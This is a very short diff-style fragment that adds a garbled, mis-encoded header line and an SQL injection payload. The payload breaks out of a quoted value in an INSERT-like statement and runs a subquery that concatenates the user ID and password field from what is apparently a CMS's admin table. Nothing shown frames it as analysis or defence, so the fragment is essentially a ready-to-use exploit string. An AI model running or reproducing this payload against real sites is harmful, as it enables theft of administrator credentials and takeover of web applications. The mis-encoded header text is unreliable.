@@ -1,0 +1,3 @@
+ø’º‰¡Ù—‘:
+
+cccccc'',(select concat(userid,0x3a,pwd) from #@__admin limit 0,1),'''','''','''',''123'',123)#
